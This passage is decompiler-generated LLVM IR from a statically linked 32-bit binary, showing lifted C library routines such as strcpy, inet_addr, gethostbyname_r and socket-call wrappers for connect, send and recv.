  %v2_8049c43 = load i8, i8* %v1_8049c43, align 1
  %v10_8049c43 = add i32 %v7_8049c43, %v9_8049c43
  %v3_8049c44 = udiv i32 %v4_8049c43, 256
  %v4_8049c44 = trunc i32 %v3_8049c44 to i8
  %v16_8049c44 = icmp eq i8 %v2_8049c43, %v4_8049c44
  br i1 %v16_8049c44, label %dec_label_pc_8049c51.loopexit, label %dec_label_pc_8049c48

dec_label_pc_8049c48:                             ; preds = %dec_label_pc_8049c43
  %v3_8049c43 = zext i8 %v2_8049c43 to i32
  %v5_8049c43 = and i32 %v4_8049c43, -256
  %v6_8049c43 = or i32 %v3_8049c43, %v5_8049c43
  %v4_8049c48 = icmp eq i8 %v2_8049c43, 0
  %v1_8049c4a = icmp eq i1 %v4_8049c48, false
  br i1 %v1_8049c4a, label %dec_label_pc_8049c43, label %dec_label_pc_8049c4c

dec_label_pc_8049c4c:                             ; preds = %dec_label_pc_8049c48
  br label %dec_label_pc_8049c51

dec_label_pc_8049c51.loopexit:                    ; preds = %dec_label_pc_8049c43
  %phitmp = add i32 %v10_8049c43, -1
  br label %dec_label_pc_8049c51

dec_label_pc_8049c51:                             ; preds = %dec_label_pc_8049c51.loopexit, %dec_label_pc_8049c4c
  %v0_8049c51 = phi i32 [ 0, %dec_label_pc_8049c4c ], [ %phitmp, %dec_label_pc_8049c51.loopexit ]
  ret i32 %v0_8049c51

; uselistorder directives
  uselistorder i8 %v2_8049c43, { 1, 2, 0 }
  uselistorder i32 %v4_8049c43, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c59 = load i32, i32* @esi, align 4
  store i32 %v0_8049c59, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8049c61 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8049c61, i32* %edi.global-to-local, align 4
  %v4_8049c65.pre = load i32, i32* @eax, align 4
  %v8_8049c65.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8049c65

dec_label_pc_8049c65:                             ; preds = %dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge, %entry
  %v2_8049c66 = phi i32 [ %v7_8049c66, %dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge ], [ %v4_8049c61, %entry ]
  %v8_8049c65 = phi i1 [ %v5_8049c66, %dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge ], [ %v8_8049c65.pre, %entry ]
  %v4_8049c65 = phi i32 [ %v0_8049c67, %dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge ], [ %v4_8049c65.pre, %entry ]
  %v7_8049c65 = phi i32 [ %v0_8049c65.pre, %dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge ], [ %arg2, %entry ]
  %v1_8049c65 = inttoptr i32 %v7_8049c65 to i8*
  %v2_8049c65 = load i8, i8* %v1_8049c65, align 1
  %v3_8049c65 = zext i8 %v2_8049c65 to i32
  %v5_8049c65 = and i32 %v4_8049c65, -256
  %v6_8049c65 = or i32 %v3_8049c65, %v5_8049c65
  store i32 %v6_8049c65, i32* %eax.global-to-local, align 4
  %v9_8049c65 = select i1 %v8_8049c65, i32 -1, i32 1
  %v10_8049c65 = add i32 %v7_8049c65, %v9_8049c65
  store i32 %v10_8049c65, i32* %esi.global-to-local, align 4
  %v3_8049c66 = inttoptr i32 %v2_8049c66 to i8*
  store i8 %v2_8049c65, i8* %v3_8049c66, align 1
  %v4_8049c66 = load i32, i32* %edi.global-to-local, align 4
  %v5_8049c66 = load i1, i1* @df, align 1
  %v6_8049c66 = select i1 %v5_8049c66, i32 -1, i32 1
  %v7_8049c66 = add i32 %v6_8049c66, %v4_8049c66
  store i32 %v7_8049c66, i32* %edi.global-to-local, align 4
  %v0_8049c67 = load i32, i32* %eax.global-to-local, align 4
  %v3_8049c67 = trunc i32 %v0_8049c67 to i8
  %v4_8049c67 = icmp eq i8 %v3_8049c67, 0
  %v1_8049c69 = icmp eq i1 %v4_8049c67, false
  br i1 %v1_8049c69, label %dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge, label %dec_label_pc_8049c6b

dec_label_pc_8049c65.dec_label_pc_8049c65_crit_edge: ; preds = %dec_label_pc_8049c65
  %v0_8049c65.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049c65

dec_label_pc_8049c6b:                             ; preds = %dec_label_pc_8049c65
  store i32 %v4_8049c61, i32* %eax.global-to-local, align 4
  %v2_8049c6f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049c6f, i32* @edx, align 4
  %v2_8049c70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049c70, i32* @esi, align 4
  ret i32 %v4_8049c61

; uselistorder directives
  uselistorder i32 %v0_8049c67, { 1, 0 }
  uselistorder i32 %v7_8049c66, { 1, 0 }
  uselistorder i1 %v5_8049c66, { 1, 0 }
  uselistorder i32 %v4_8049c61, { 1, 2, 0, 3 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8049c84 = inttoptr i32 %arg2 to i8*
  %v3_8049c84 = call i32 @memmove(i8* %v2_8049c84, i32 %arg1)
  ret i32 %v3_8049c84
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8049c9c = inttoptr i32 %arg1 to i8*
  %v4_8049c9c = call i32 @strtok_r(i8* %v3_8049c9c, i32 %arg2, i32 ptrtoint (i32* @global_var_805231c.29 to i32))
  ret i32 %v4_8049c9c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cac = trunc i32 %arg1 to i16
  %v2_8049cac = call i16 @llvm.bswap.i16(i16 %v1_8049cac)
  %v3_8049cac = zext i16 %v2_8049cac to i32
  ret i32 %v3_8049cac
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cb8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049cb8
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cbf = trunc i32 %arg1 to i16
  %v2_8049cbf = call i16 @llvm.bswap.i16(i16 %v1_8049cbf)
  %v3_8049cbf = zext i16 %v2_8049cbf to i32
  ret i32 %v3_8049cbf
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049ccb = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049ccb
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8049cd3 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8049cdc = inttoptr i32 %arg1 to i8*
  %v3_8049cdc = call i32 @inet_aton(i8* %v2_8049cdc, i32 %v2_8049cd3)
  %v1_8049ce7 = icmp eq i32 %v3_8049cdc, 0
  br i1 %v1_8049ce7, label %dec_label_pc_8049cef, label %dec_label_pc_8049ceb

dec_label_pc_8049ceb:                             ; preds = %entry
  %v3_8049ceb = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %entry, %dec_label_pc_8049ceb
  %v0_8049cef = phi i32 [ -1, %entry ], [ %v3_8049ceb, %dec_label_pc_8049ceb ]
  ret i32 %v0_8049cef

; uselistorder directives
  uselistorder label %dec_label_pc_8049cef, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cfb = call i32 @__GI___h_errno_location()
  %v0_8049d00 = load i32, i32* @edx, align 4
  %v2_8049d03 = ptrtoint i32* %stack_var_-4 to i32
  %v9_8049d1b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80524ec.31, i32 ptrtoint (i32* @global_var_8052320.30 to i32), i32 460, i32 %v2_8049d03, i32 %v0_8049cfb, i32 %v0_8049d00, i32 %v0_8049d00)
  %v3_8049d20 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8049d20
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8049d28 = load i32, i32* @ebp, align 4
  %v0_8049d29 = load i32, i32* @edi, align 4
  %v0_8049d2a = load i32, i32* @esi, align 4
  %v0_8049d2b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8049d3b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8049d3b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8049d46 = icmp eq i32 %arg1, 0
  br i1 %v4_8049d46, label %dec_label_pc_804a052, label %dec_label_pc_8049d51

dec_label_pc_8049d51:                             ; preds = %entry
  %v1_8049d51 = call i32 @__errno_location(i32 %v0_8049d2b)
  store i32 %v1_8049d51, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d51, i32* @esi, align 4
  %v1_8049d58 = inttoptr i32 %v1_8049d51 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* @edi, align 4
  store i32 0, i32* %v1_8049d58, align 4
  %v0_8049d69 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d69, i32* %stack_var_-108, align 4
  %v7_8049d75 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8049d69, i32 %arg5, i32 %arg6, i32 %v1_8049d51)
  store i32 %v7_8049d75, i32* %eax.global-to-local, align 4
  %v1_8049d7d = icmp eq i32 %v7_8049d75, 0
  br i1 %v1_8049d7d, label %dec_label_pc_804a052, label %dec_label_pc_8049d85

dec_label_pc_8049d85:                             ; preds = %dec_label_pc_8049d51
  %v1_8049d89 = inttoptr i32 %arg6 to i32*
  %v2_8049d89 = load i32, i32* %v1_8049d89, align 4
  store i32 %v2_8049d89, i32* %edx.global-to-local, align 4
  %v9_8049d8b = icmp eq i32 %v2_8049d89, 1
  br i1 %v9_8049d8b, label %dec_label_pc_8049da5, label %dec_label_pc_8049d90

dec_label_pc_8049d90:                             ; preds = %dec_label_pc_8049d85
  %v9_8049d90 = icmp eq i32 %v2_8049d89, 4
  br i1 %v9_8049d90, label %dec_label_pc_8049da5, label %dec_label_pc_8049d95

dec_label_pc_8049d95:                             ; preds = %dec_label_pc_8049d90
  %v1_8049d95 = add i32 %v2_8049d89, 1
  %v8_8049d95 = icmp eq i32 %v1_8049d95, 0
  store i32 %v1_8049d95, i32* %edx.global-to-local, align 4
  %v1_8049d96 = icmp eq i1 %v8_8049d95, false
  br i1 %v1_8049d96, label %dec_label_pc_804a052, label %dec_label_pc_8049d9c

dec_label_pc_8049d9c:                             ; preds = %dec_label_pc_8049d95
  %v0_8049d9c = load i32, i32* @esi, align 4
  %v1_8049d9c = inttoptr i32 %v0_8049d9c to i32*
  %v2_8049d9c = load i32, i32* %v1_8049d9c, align 4
  %v11_8049d9c = icmp eq i32 %v2_8049d9c, 2
  %v1_8049d9f = icmp eq i1 %v11_8049d9c, false
  br i1 %v1_8049d9f, label %dec_label_pc_804a052, label %dec_label_pc_8049da5

dec_label_pc_8049da5:                             ; preds = %dec_label_pc_8049d9c, %dec_label_pc_8049d90, %dec_label_pc_8049d85
  %v0_8049da5 = load i32, i32* @ebp, align 4
  store i32 %v0_8049da5, i32* %eax.global-to-local, align 4
  %v0_8049da7 = load i32, i32* @edi, align 4
  %v1_8049da7 = load i32, i32* @esi, align 4
  %v2_8049da7 = inttoptr i32 %v1_8049da7 to i32*
  store i32 %v0_8049da7, i32* %v2_8049da7, align 4
  %v0_8049da9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049da9 = sub i32 0, %v0_8049da9
  %v1_8049dab = urem i32 %v1_8049da9, 4
  %v2_8049dab = icmp eq i32 %v1_8049dab, 0
  store i32 %v1_8049dab, i32* %eax.global-to-local, align 4
  %v0_8049dc0.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8049dab, label %dec_label_pc_8049dbc, label %dec_label_pc_8049db0

dec_label_pc_8049db0:                             ; preds = %dec_label_pc_8049da5
  %v2_8049db0 = sub i32 %v0_8049dc0.pre, %v1_8049dab
  %v7_8049db0 = icmp ult i32 %v0_8049dc0.pre, %v1_8049dab
  br i1 %v7_8049db0, label %dec_label_pc_804a04d, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049db0
  %v0_8049db8 = load i32, i32* @ebp, align 4
  %v2_8049db8 = add i32 %v0_8049db8, %v1_8049dab
  store i32 %v2_8049db8, i32* @ebp, align 4
  store i32 %v2_8049db0, i32* @ebx, align 4
  br label %dec_label_pc_8049dbc

dec_label_pc_8049dbc:                             ; preds = %dec_label_pc_8049da5, %dec_label_pc_8049db8
  %v0_8049dc0 = phi i32 [ %v2_8049db0, %dec_label_pc_8049db8 ], [ %v0_8049dc0.pre, %dec_label_pc_8049da5 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8049d89, align 4
  %tmp43 = icmp ult i32 %v0_8049dc0, 4
  br i1 %tmp43, label %dec_label_pc_804a04d, label %dec_label_pc_8049dcf

dec_label_pc_8049dcf:                             ; preds = %dec_label_pc_8049dbc
  %v0_8049dcf = load i32, i32* @ebx, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, -4
  store i32 %v1_8049dcf, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8049dcf, 8
  br i1 %tmp44, label %dec_label_pc_804a04d, label %dec_label_pc_8049ddb

dec_label_pc_8049ddb:                             ; preds = %dec_label_pc_8049dcf
  %v0_8049ddb = load i32, i32* @ebp, align 4
  %v1_8049ddb = add i32 %v0_8049ddb, 4
  store i32 %v1_8049ddb, i32* %edx.global-to-local, align 4
  %v1_8049dde = add i32 %v0_8049dcf, -12
  store i32 %v1_8049dde, i32* %eax.global-to-local, align 4
  store i32 %v1_8049ddb, i32* %stack_var_-92, align 4
  %v3_8049de7 = inttoptr i32 %v1_8049ddb to i32*
  store i32 %v0_8049ddb, i32* %v3_8049de7, align 4
  %v0_8049dea = load i32, i32* %edx.global-to-local, align 4
  %v1_8049dea = add i32 %v0_8049dea, 4
  %v2_8049dea = inttoptr i32 %v1_8049dea to i32*
  store i32 0, i32* %v2_8049dea, align 4
  %tmp45 = icmp ult i32 %v1_8049dde, 32
  br i1 %tmp45, label %dec_label_pc_804a04d, label %dec_label_pc_8049df7

dec_label_pc_8049df7:                             ; preds = %dec_label_pc_8049ddb
  %v0_8049df7 = load i32, i32* @ebx, align 4
  %v1_8049df7 = add i32 %v0_8049df7, -44
  store i32 %v1_8049df7, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_8049df7, 256
  br i1 %tmp46, label %dec_label_pc_804a04d, label %dec_label_pc_8049e0a

dec_label_pc_8049e0a:                             ; preds = %dec_label_pc_8049df7
  %v0_8049e0a = load i32, i32* @ebp, align 4
  %v1_8049e0a = add i32 %v0_8049e0a, 12
  %v1_8049e0d = add i32 %v0_8049e0a, 44
  store i32 %v1_8049e0d, i32* @edi, align 4
  store i32 %v1_8049e0d, i32* %stack_var_-108, align 4
  %v4_8049e1e = inttoptr i32 %v1_8049e0d to i8*
  %v5_8049e1e = call i32 @strncpy(i8* %v4_8049e1e, i32 %arg1, i32 %v1_8049df7, i32 %v1_8049e0a)
  %v0_8049e23 = load i32, i32* @edi, align 4
  %v1_8049e23 = load i32, i32* @ebp, align 4
  %v2_8049e23 = add i32 %v1_8049e23, 12
  %v3_8049e23 = inttoptr i32 %v2_8049e23 to i32*
  store i32 %v0_8049e23, i32* %v3_8049e23, align 4
  %v1_8049e2a = add i32 %v0_8049e0a, 16
  %v2_8049e2a = inttoptr i32 %v1_8049e2a to i32*
  store i32 0, i32* %v2_8049e2a, align 4
  %v2_8049e31 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8049e31, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8049e33 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8049e38 = inttoptr i32 %arg1 to i8*
  %v3_8049e38 = call i32 @inet_aton(i8* %v2_8049e38, i32 %v0_8049e33)
  store i32 %v3_8049e38, i32* %eax.global-to-local, align 4
  %v1_8049e40 = icmp eq i32 %v3_8049e38, 0
  br i1 %v1_8049e40, label %dec_label_pc_8049e7c, label %dec_label_pc_8049e44

dec_label_pc_8049e44:                             ; preds = %dec_label_pc_8049e0a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8049e48 = load i32, i32* @edi, align 4
  store i32 %v0_8049e48, i32* %arg2, align 4
  %v1_8049e4a = add i32 %tmp18, 8
  %v2_8049e4a = inttoptr i32 %v1_8049e4a to i32*
  store i32 2, i32* %v2_8049e4a, align 4
  %v0_8049e51 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049e51 = add i32 %v0_8049e51, 12
  %v2_8049e51 = inttoptr i32 %v1_8049e51 to i32*
  store i32 4, i32* %v2_8049e51, align 4
  %v2_8049e58 = load i32, i32* %stack_var_-92, align 4
  %v1_8049e5b = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e5b = add i32 %v1_8049e5b, 16
  %v3_8049e5b = inttoptr i32 %v2_8049e5b to i32*
  store i32 %v2_8049e58, i32* %v3_8049e5b, align 4
  %v1_8049e62 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e62 = add i32 %v1_8049e62, 4
  %v3_8049e62 = inttoptr i32 %v2_8049e62 to i32*
  store i32 %v1_8049e0a, i32* %v3_8049e62, align 4
  %v0_8049e69 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8049e69, i32* %v1_8049d3b, align 4
  store i32 0, i32* %v1_8049d89, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a052

dec_label_pc_8049e7c:                             ; preds = %dec_label_pc_8049e0a
  %v0_8049e7c = call i32 @__open_nameservers()
  store i32 %v0_8049e7c, i32* @eax, align 4
  %v2_8049e8c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8049e8c, i32* @ebx, align 4
  store i32 %v2_8049e8c, i32* %stack_var_-108, align 4
  %v2_8049e91 = call i32 @__pthread_return_void(i32 %v2_8049e8c, i32 134526403)
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %stack_var_-108, align 4
  %v1_8049e9d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* @ecx, align 4
  store i32 134526403, i32* @eax, align 4
  store i32 %v2_8049e8c, i32* %stack_var_-108, align 4
  %v0_8049ea7 = load i32, i32* @global_var_8054994.33, align 4
  store i32 %v0_8049ea7, i32* @esi, align 4
  %v2_8049ead = call i32 @__pthread_return_void(i32 %v2_8049e8c, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8049ec8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8049ecd = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8049ecd, i32* %eax.global-to-local, align 4
  store i32 %v2_8049ecd, i32* %stack_var_-108, align 4
  %v0_8049ed7 = load i32, i32* @esi, align 4
  %v7_8049ede = call i32 @__dns_lookup(i8* %v2_8049e38, i32 1, i32 %v0_8049ed7, i32 ptrtoint (i32* @global_var_8054988.34 to i32), i32 %v2_8049ecd, i32 %v2_8049ec8)
  store i32 %v7_8049ede, i32* %eax.global-to-local, align 4
  %v2_8049ee6 = icmp slt i32 %v7_8049ede, 0
  %v1_8049ee8 = icmp eq i1 %v2_8049ee6, false
  br i1 %v1_8049ee8, label %dec_label_pc_8049efe, label %dec_label_pc_8049eea

dec_label_pc_8049eea:                             ; preds = %dec_label_pc_8049e7c
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8049d89, align 4
  br label %dec_label_pc_804a052

dec_label_pc_8049efe:                             ; preds = %dec_label_pc_8049e7c
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8049f11 = icmp ugt i32 %v1_8049df7, 256
  %v15_8049f11 = icmp eq i32 %v0_8049df7, 300
  %v2_8049f15 = or i1 %v15_8049f11, %v10_8049f11
  br i1 %v2_8049f15, label %dec_label_pc_8049fb0, label %dec_label_pc_8049f17

dec_label_pc_8049f17:                             ; preds = %dec_label_pc_8049efe
  %v3_8049f1a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8049f1a, i32* %stack_var_-108, align 4
  %v1_8049f1e = call i32 @free(i32 %v3_8049f1a)
  store i32 %v1_8049f1e, i32* %eax.global-to-local, align 4
  store i32 %v3_8049f1a, i32* @edi, align 4
  %v3_8049f24 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8049f24, i32* %stack_var_-108, align 4
  %v1_8049f28 = call i32 @free(i32 %v3_8049f24)
  store i32 -1, i32* %v1_8049d89, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a028

dec_label_pc_8049fb0:                             ; preds = %dec_label_pc_8049efe
  %v3_8049fb5.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8049fb9.pre = load i32, i32* @edi, align 4
  store i32 %v0_8049fb9.pre, i32* %stack_var_-108, align 4
  %v4_8049fba = inttoptr i32 %v0_8049fb9.pre to i8*
  %v5_8049fba = call i32 @strncpy(i8* %v4_8049fba, i32 %v3_8049fb5.pre, i32 %v1_8049df7, i32 %v2_8049e8c)
  store i32 %v5_8049fba, i32* %eax.global-to-local, align 4
  %v3_8049fc0 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8049fc0, i32* %stack_var_-108, align 4
  %v1_8049fc4 = call i32 @free(i32 %v3_8049fc0)
  store i32 %v1_8049fc4, i32* %eax.global-to-local, align 4
  %v12_8049fcc = icmp eq i32 %tmp10, 1
  %v1_8049fd1 = icmp eq i1 %v12_8049fcc, false
  br i1 %v1_8049fd1, label %dec_label_pc_804a02d, label %dec_label_pc_8049fd3

dec_label_pc_8049fd3:                             ; preds = %dec_label_pc_8049fb0
  %v0_8049fd3 = load i32, i32* @edx, align 4
  %v0_8049fda = load i32, i32* @ebp, align 4
  store i32 %v0_8049fda, i32* %stack_var_-108, align 4
  %v3_8049fdb = inttoptr i32 %tmp to i16*
  %v4_8049fdb = call i32 @memcpy(i16* %v3_8049fdb, i32 4, i32 %v0_8049fd3)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8049fe4 = load i32, i32* @edi, align 4
  store i32 %v0_8049fe4, i32* %arg2, align 4
  %v1_8049fe6 = add i32 %tmp18, 8
  %v2_8049fe6 = inttoptr i32 %v1_8049fe6 to i32*
  store i32 2, i32* %v2_8049fe6, align 4
  %v0_8049fed = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fed = add i32 %v0_8049fed, 12
  %v2_8049fed = inttoptr i32 %v1_8049fed to i32*
  store i32 4, i32* %v2_8049fed, align 4
  %v3_8049ff4 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8049ff4, i32* %edx.global-to-local, align 4
  %v1_8049ff8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049ff8 = add i32 %v1_8049ff8, 16
  %v3_8049ff8 = inttoptr i32 %v2_8049ff8 to i32*
  store i32 %v3_8049ff4, i32* %v3_8049ff8, align 4
  %v1_8049fff = load i32, i32* %eax.global-to-local, align 4
  %v2_8049fff = add i32 %v1_8049fff, 4
  %v3_8049fff = inttoptr i32 %v2_8049fff to i32*
  store i32 %v1_8049e0a, i32* %v3_8049fff, align 4
  %v2_804a002 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804a002, i32* %eax.global-to-local, align 4
  %v3_804a003 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a003, i32* %stack_var_-108, align 4
  %v1_804a007 = call i32 @free(i32 %v3_804a003)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8049d3b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8049d89, align 4
  br label %dec_label_pc_804a028

dec_label_pc_804a028:                             ; preds = %dec_label_pc_804a02d, %dec_label_pc_8049f17, %dec_label_pc_8049fd3
  br label %dec_label_pc_804a052

dec_label_pc_804a02d:                             ; preds = %dec_label_pc_8049fb0
  %v3_804a030 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a030, i32* %stack_var_-108, align 4
  %v1_804a034 = call i32 @free(i32 %v3_804a030)
  store i32 1, i32* %v1_8049d89, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a028

dec_label_pc_804a04d:                             ; preds = %dec_label_pc_8049df7, %dec_label_pc_8049ddb, %dec_label_pc_8049dcf, %dec_label_pc_8049dbc, %dec_label_pc_8049db0
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a052

dec_label_pc_804a052:                             ; preds = %dec_label_pc_8049d9c, %dec_label_pc_8049d95, %dec_label_pc_8049d51, %entry, %dec_label_pc_804a028, %dec_label_pc_8049eea, %dec_label_pc_8049e44, %dec_label_pc_804a04d
  store i32 %v0_8049d2b, i32* @ebx, align 4
  store i32 %v0_8049d2a, i32* @esi, align 4
  store i32 %v0_8049d29, i32* @edi, align 4
  store i32 %v0_8049d28, i32* @ebp, align 4
  %v0_804a059 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804a059

; uselistorder directives
  uselistorder i32 %v2_8049e8c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_8049e0d, { 1, 0, 2 }
  uselistorder i32 %v1_8049e0a, { 2, 1, 0 }
  uselistorder i32 %v1_8049df7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8049dc0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8049dab, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8049d89, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8049d89, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8049d3b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804a052, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a028, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8049dbc, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a077 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a07e = call i32 @__socketcall(i32 3, i32 %v2_804a077)
  ret i32 %v2_804a07e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804a0b3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804a0ba = call i32 @__socketcall(i32 15, i32 %v2_804a0b3)
  ret i32 %v2_804a0ba

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a0e7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a0ee = call i32 @__socketcall(i32 10, i32 %v2_804a0e7)
  ret i32 %v2_804a0ee

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a11b = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a122 = call i32 @__socketcall(i32 9, i32 %v2_804a11b)
  ret i32 %v2_804a122

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
